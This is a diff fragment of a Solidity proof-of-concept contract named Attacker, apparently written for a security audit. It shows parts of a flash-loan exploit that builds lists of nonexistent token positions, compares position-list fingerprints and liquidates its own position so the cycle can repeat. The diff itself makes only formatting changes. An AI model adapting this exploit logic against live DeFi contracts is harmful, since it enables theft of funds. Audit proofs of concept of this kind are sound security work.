@@ -638,7 +638,6 @@ contract Attacker is IFlashLoanReceiver {
             fakeTokenIdList[i] = TokenId.wrap(fake_token_uints[i]);
         }
 
-
         // Now use the list of positions that don't exist
 
         // calculate how much I can withdraw
@@ -658,15 +657,18 @@ contract Attacker is IFlashLoanReceiver {
         console.log("my final token 1 balance: ", token1.balanceOf(address(this)));
         console.log("------------------------");
 
-        console.log('posIdList2 fingerprint', generateFingerprint(posIdList2, 0));
-        console.log('fakeTokenIdList fingerprint', generateFingerprint(fakeTokenIdList, 0));
+        console.log("posIdList2 fingerprint", generateFingerprint(posIdList2, 0));
+        console.log("fakeTokenIdList fingerprint", generateFingerprint(fakeTokenIdList, 0));
 
         // now liquidate my own position and repeat...
         TokenId[] memory emptyTokenList = new TokenId[](0);
         pp.liquidate(emptyTokenList, address(this), posIdList2);
     }
 
-    function generateFingerprint(TokenId[] memory positionIdList, uint256 offset) internal pure returns (uint256) {
+    function generateFingerprint(
+        TokenId[] memory positionIdList,
+        uint256 offset
+    ) internal pure returns (uint256) {
         uint256 pLength = positionIdList.length - offset;
         uint256 fingerprintIncomingList;
 
@@ -676,7 +678,7 @@ contract Attacker is IFlashLoanReceiver {
                 positionIdList[i],
                 true
             );
-            console.log('fingerprintIncomingList at position index:', i);
+            console.log("fingerprintIncomingList at position index:", i);
             console.log(fingerprintIncomingList);
             unchecked {
                 ++i;
